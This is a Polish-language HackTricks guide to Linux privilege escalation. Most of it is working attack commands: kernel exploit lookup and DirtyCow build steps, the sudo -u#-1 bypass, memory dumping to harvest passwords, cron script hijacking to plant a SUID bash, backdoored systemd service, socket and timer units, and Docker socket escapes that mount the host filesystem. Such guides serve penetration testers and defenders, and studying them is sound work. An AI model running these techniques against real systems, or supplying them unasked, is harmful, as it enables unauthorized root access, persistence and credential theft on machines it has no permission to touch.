# Eskalacja uprawnień w systemie Linux

{% hint style="success" %}
Dowiedz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy zdobywać wiedzę na temat działającego systemu operacyjnego.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym folderze w zmiennej `PATH`**, możesz próbować przejąć kontrolę nad niektórymi bibliotekami lub binarkami:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Wykorzystania jądra

Sprawdź wersję jądra i czy istnieje jakieś wykorzystanie, które można wykorzystać do eskalacji uprawnień
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder oraz już **skompilowane exploit'y** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Inne strony, gdzie można znaleźć **skompilowane exploit'y**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony internetowej, można użyć:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu exploitów jądra to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (wykonaj NA ofierze, sprawdza tylko exploity dla jądra 2.x)

Zawsze **sprawdź wersję jądra w Google**, być może Twoja wersja jądra jest wymieniona w jakimś exploicie jądra, wtedy będziesz pewien, że ten exploit jest ważny.

### CVE-2016-5195 (DirtyCow)

Eskalacja uprawnień w systemie Linux - Jądro Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji sudo, które występują w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Weryfikacja podpisu Dmesg nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład**, jak ta podatność mogłaby zostać wykorzystana
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej wyliczeń systemowych
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe obrony

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Ucieczka z Docker

Jeśli jesteś wewnątrz kontenera Docker, możesz spróbować z niego uciec:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Dyski

Sprawdź, **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować je zamontować i sprawdzić prywatne informacje.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wylicz użyteczne pliki binarne
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź również, czy **zainstalowano jakikolwiek kompilator**. Jest to przydatne, jeśli musisz użyć jakiegoś exploitu jądra, ponieważ zaleca się kompilowanie go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane oprogramowanie podatne

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może istnieje stara wersja Nagiosa (na przykład), która mogłaby zostać wykorzystana do eskalacji uprawnień...\
Zaleca się ręczne sprawdzenie wersji najbardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS** do sprawdzenia, czy zainstalowane wewnątrz maszyny oprogramowanie jest przestarzałe i podatne na ataki.

{% hint style="info" %}
_Zauważ, że te polecenia pokażą wiele informacji, które będą w większości bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy któraś z zainstalowanych wersji oprogramowania jest podatna na znane exploity_
{% endhint %}

## Procesy

Sprawdź, **jakie procesy** są uruchomione i sprawdź, czy którykolwiek proces ma **więcej uprawnień niż powinien** (może to być na przykład tomcat uruchamiany przez roota?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy są uruchomione [**debuggery electron/cef/chromium**, możesz je wykorzystać do eskalacji uprawnień](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
Sprawdź również swoje uprawnienia do binarnych procesów, być może możesz je nadpisać.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikacji podatnych procesów wykonywanych często lub gdy spełnione są określone wymagania.

### Pamięć procesu

Niektóre usługi serwera zapisują **poświadczenia w postaci tekstu jawnego w pamięci**.\
Zazwyczaj będziesz potrzebować **uprawnień roota** do odczytania pamięci procesów należących do innych użytkowników, dlatego jest to zazwyczaj bardziej przydatne, gdy już jesteś rootem i chcesz odkryć więcej poświadczeń.\
Jednak pamiętaj, że **jako zwykły użytkownik możesz odczytać pamięć procesów, które posiadasz**.

{% hint style="warning" %}
Zauważ, że obecnie większość maszyn **nie zezwala domyślnie na ptrace**, co oznacza, że nie możesz dumpować innych procesów należących do twojego użytkownika bez uprawnień.

Plik _**/proc/sys/kernel/yama/ptrace\_scope**_ kontroluje dostępność ptrace:

* **kernel.yama.ptrace\_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają takie same uid. To klasyczny sposób działania ptrace.
* **kernel.yama.ptrace\_scope = 1**: tylko proces nadrzędny może być debugowany.
* **kernel.yama.ptrace\_scope = 2**: Tylko administrator może używać ptrace, ponieważ wymaga to CAP\_SYS\_PTRACE capability.
* **kernel.yama.ptrace\_scope = 3**: Żaden proces nie może być śledzony za pomocą ptrace. Po ustawieniu wymagany jest restart, aby ponownie włączyć śledzenie.
{% endhint %}

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać dostęp do sterty i przeszukać w niej poświadczenia.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Dla określonego identyfikatora procesu **mapy pokazują, jak pamięć jest odwzorowana w przestrzeni adresowej tego procesu**; pokazuje również **uprawnienia każdego odwzorowanego obszaru**. Plik pseudopamięci **mem ujawnia samą pamięć procesów**. Z pliku **maps** wiemy, które **obszary pamięci są odczytywalne** i ich przesunięcia. Wykorzystujemy tę informację, aby **przeszukać plik mem i zrzucić wszystkie odczytywalne obszary** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **fizycznej** pamięci systemu, a nie do pamięci wirtualnej. Przestrzeń adresowa wirtualna jądra może być dostępna za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest tylko do odczytu przez użytkownika **root** i grupę **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla systemu Linux

ProcDump to linuxowa reinterpretacja klasycznego narzędzia ProcDump z pakietu narzędzi Sysinternals dla systemu Windows. Pobierz go z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące uprawnień roota i zrzucić proces należący do Ciebie
* Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagane są uprawnienia roota)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli zauważysz, że proces autentykatora jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz wyświetlić zawartość procesu (zobacz poprzednie sekcje, aby znaleźć różne sposoby na wyświetlenie pamięci procesu) i wyszukać poświadczenia w pamięci:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **ukradnie hasła w postaci tekstu jawnego z pamięci** oraz z **niektórych znanych plików**. Do poprawnego działania wymaga uprawnień roota.

| Funkcja                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)          | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (Aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (Aktywne sesje SSH - Użycie Sudo)         | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane/Zadania Cron

Sprawdź, czy jakiekolwiek zaplanowane zadanie jest podatne. Być może możesz skorzystać z skryptu wykonywanego przez użytkownika root (podatność na symbol wieloznaczny? czy można modyfikować pliki, których używa root? użyć dowiązań symbolicznych? utworzyć określone pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka Cron

Na przykład, wewnątrz _/etc/crontab_ można znaleźć ścieżkę: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, jak użytkownik "user" ma uprawnienia do zapisu w /home/user_)

Jeśli w tej crontab root próbuje wykonać pewne polecenie lub skrypt bez ustawiania ścieżki. Na przykład: _\* \* \* \* root overwrite.sh_\
W takim przypadku, można uzyskać powłokę roota używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z symbolem wieloznacznym (Wstrzyknięcie Symboli)

Jeśli skrypt jest wykonywany przez roota i zawiera „**\***” wewnątrz polecenia, można to wykorzystać do wykonania nieoczekiwanych działań (np. eskalacji uprawnień). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli symbol wieloznaczny poprzedza ścieżkę, na przykład** _**/some/path/\***_, **to nie jest podatne na atak (nawet** _**./\***_ **też nie jest).**

Przeczytaj następną stronę, aby poznać więcej sztuczek związanych z wykorzystaniem symboli wieloznacznych:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Nadpisywanie skryptu Cron i symlink

Jeśli **możesz modyfikować skrypt Cron** uruchamiany przez roota, możesz bardzo łatwo uzyskać dostęp do powłoki:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt uruchomiony przez roota używa **katalogu, do którego masz pełny dostęp**, być może przydatne będzie usunięcie tego folderu i **utworzenie symlinku do innego**, służącego skryptowi kontrolowanemu przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste zadania cron

Możesz monitorować procesy, aby szukać tych, które są wykonywane co 1, 2 lub 5 minut. Być może możesz skorzystać z tego i eskalować uprawnienia.

Na przykład, aby **monitorować co 0,1s przez 1 minutę**, **sortować według mniej wykonywanych poleceń** i usuwać polecenia, które zostały wykonane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to narzędzie monitoruje i wyświetla każdy proces, który się uruchamia).

### Niewidoczne zadania cron

Możliwe jest utworzenie zadania cron, **dodając znak powrotu karetki po komentarzu** (bez znaku nowej linii), a zadanie cron będzie działać. Przykład (zauważ znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ z możliwością zapisu

Sprawdź, czy możesz zapisać jakikolwiek plik `.service`, jeśli tak, **możesz go zmodyfikować**, aby **wykonywał** twój **tylny wejście** po uruchomieniu, ponownym uruchomieniu lub zatrzymaniu usługi (być może będziesz musiał poczekać, aż maszyna zostanie ponownie uruchomiona).\
Na przykład, stwórz swoje tylne wejście wewnątrz pliku .service za pomocą **`ExecStart=/tmp/script.sh`**

### Binaria usług z możliwością zapisu

Pamiętaj, że jeśli masz **uprawnienia do zapisu do binariów wykonywanych przez usługi**, możesz je zmienić na tylne wejścia, więc gdy usługi zostaną ponownie uruchomione, tylne wejścia zostaną wykonane.

### Ścieżki systemd - Ścieżki względne

Możesz zobaczyć używaną ścieżkę **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w którymkolwiek z folderów ścieżki, możesz mieć możliwość **eskalacji uprawnień**. Musisz szukać plików konfiguracyjnych usług, w których używane są **ścieżki względne**.
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **wykonywalny** plik o **takiej samej nazwie jak względna ścieżka binarna** w folderze PATH systemd, do którego masz uprawnienia do zapisu, a gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), zostanie wykonane twoje **tylne drzwi** (zwykle użytkownicy nieuprzywilejowani nie mogą uruchamiać/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, kontrolujące pliki lub zdarzenia `**.service**`. **Timery** mogą być używane jako alternatywa dla cron, ponieważ posiadają wbudowane wsparcie dla zdarzeń kalendarzowych i zdarzeń czasu monotonicznego oraz mogą być uruchamiane asynchronicznie.

Możesz wyświetlić wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że będzie wykonywał istniejące jednostki systemd (takie jak `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji można przeczytać, co to jest jednostka:

> Jednostka do aktywacji po upływie tego timera. Argumentem jest nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie jest określone, ta wartość domyślnie ustawia się na usługę, która ma taką samą nazwę jak jednostka timera, z wyjątkiem sufiksu. (Patrz powyżej.) Zaleca się, aby nazwa jednostki aktywowanej i nazwa jednostki timera były nazwane identycznie, z wyjątkiem sufiksu.

W związku z tym, aby wykorzystać to uprawnienie, musiałbyś:

* Znaleźć jakąś jednostkę systemd (np. `.service`), która **wykonuje zapisywalny plik binarny**
* Znaleźć jakąś jednostkę systemd, która **wykonuje ścieżkę względną** i masz **uprawnienia do zapisu** w **ścieżce systemd** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i wykonaj:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zauważ, że **timer** jest **aktywowany** poprzez utworzenie symlinku do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację procesów** w ramach tych samych lub różnych maszyn w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji międzykomputerowej i są konfigurowane za pomocą plików `.socket`.

Gniazda można skonfigurować za pomocą plików `.socket`.

**Dowiedz się więcej o gniazdach za pomocą `man systemd.socket`.** Wewnątrz tego pliku można skonfigurować kilka interesujących parametrów:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje są różne, ale podsumowanie jest używane do **wskazania, gdzie będzie nasłuchiwać** gniazdo (ścieżka pliku gniazda AF\_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania, itp.)
* `Accept`: Przyjmuje argument logiczny. Jeśli jest **true**, dla każdego przychodzącego połączenia uruchamiana jest **instancja usługi** i tylko gniazdo połączenia jest do niej przekazywane. Jeśli jest **false**, wszystkie nasłuchujące gniazda same są **przekazywane do uruchomionej jednostki usługi**, i tylko jedna jednostka usługi jest uruchamiana dla wszystkich połączeń. Ta wartość jest ignorowana dla gniazd datagramowych i FIFO, gdzie pojedyncza jednostka usługi bezwarunkowo obsługuje cały ruch przychodzący. **Domyślnie false**. Ze względów wydajnościowych zaleca się pisanie nowych demonów tylko w sposób odpowiedni dla `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Przyjmuje jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **gniazd**/FIFO. Pierwszy token linii poleceń musi być bezwzględną nazwą pliku, a następnie argumenty dla procesu.
* `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **gniazd**/FIFO.
* `Service`: Określa nazwę jednostki **usługi do aktywacji** na **ruchu przychodzącym**. To ustawienie jest dozwolone tylko dla gniazd z Accept=no. Domyślnie jest to usługa, która nosi tę samą nazwę co gniazdo (z zamienionym sufiksem). W większości przypadków nie powinno być konieczne korzystanie z tej opcji.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w rodzaju: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie wykonany przed utworzeniem gniazda. W związku z tym **prawdopodobnie będziesz musiał poczekać, aż maszyna zostanie ponownie uruchomiona.**\
_Zauważ, że system musi korzystać z tej konfiguracji pliku gniazda, w przeciwnym razie backdoor nie zostanie wykonany_

### Zapisywalne gniazda

Jeśli **zidentyfikujesz jakiekolwiek zapisywalne gniazdo** (_teraz mówimy o gniazdach Unix, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym gniazdem i być może wykorzystać lukę w zabezpieczeniach.

### Wyliczanie gniazd Unix
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Gniazda HTTP

Zauważ, że mogą istnieć **gniazda nasłuchujące żądań HTTP** (_Nie mówię o plikach .socket, ale o plikach działających jako gniazda Unix_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli gniazdo **odpowiada żądaniem HTTP**, możesz z nim **komunikować się** i być może **wykorzystać jakieś podatności**.

### Zapisywalne gniazdo Dockera

Gniazdo Dockera, często znajdujące się pod ścieżką `/var/run/docker.sock`, to istotny plik, który powinien być zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie uprawnień do zapisu tego gniazda może prowadzić do eskalacji uprawnień. Oto analiza, jak to można zrobić, oraz alternatywne metody, jeśli interfejs wiersza poleceń Dockera nie jest dostępny.

#### **Eskalacja uprawnień za pomocą Docker CLI**

Jeśli masz uprawnienia do zapisu w gnieździe Dockera, możesz eskalować uprawnienia, korzystając z następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z dostępem na poziomie roota do systemu plików hosta.

#### **Korzystanie z interfejsu API Dockera bezpośrednio**

W przypadkach, gdy interfejs wiersza poleceń Dockera nie jest dostępny, gniazdo Dockera nadal można manipulować za pomocą interfejsu API Dockera i poleceń `curl`.

1.  **Wyświetl obrazy Dockera:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Utwórz kontener:** Wyślij żądanie utworzenia kontenera, który montuje katalog główny systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Podłącz się do kontenera:** Użyj `socat` do nawiązania połączenia z kontenerem, umożliwiając wykonanie poleceń w nim.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po skonfigurowaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z dostępem na poziomie roota do systemu plików hosta.

### Inne

Zauważ, że jeśli masz uprawnienia do zapisu w gnieździe Dockera, ponieważ jesteś **wewnątrz grupy `docker`**, masz [**więcej sposobów na eskalację uprawnień**](interesting-groups-linux-pe/#docker-group). Jeśli [**interfejs API Dockera nasłuchuje na porcie** możesz również go skompromitować](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wyjście z Dockera lub nadużycie go do eskalacji uprawnień** w:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Eskalacja uprawnień w Containerd (ctr)

Jeśli możesz użyć polecenia **`ctr`**, przeczytaj następną stronę, ponieważ **możesz go wykorzystać do eskalacji uprawnień**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Eskalacja uprawnień w **RunC**

Jeśli możesz użyć polecenia **`runc`**, przeczytaj następną stronę, ponieważ **możesz go wykorzystać do eskalacji uprawnień**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom efektywną interakcję i udostępnianie danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidną strukturę dla różnych form komunikacji aplikacji.

System jest wszechstronny, obsługując podstawową IPC, która ułatwia wymianę danych między procesami, przypominając **ulepszone gniazda domeny UNIX**. Ponadto wspiera nadawanie sygnałów lub zdarzeń, sprzyjając bezproblemowej integracji między komponentami systemu. Na przykład sygnał od demona Bluetooth o nadchodzącym połączeniu może skłonić odtwarzacz muzyki do wyciszenia, poprawiając wrażenia użytkownika. Ponadto D-Bus obsługuje system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, usprawniając procesy, które tradycyjnie były skomplikowane.

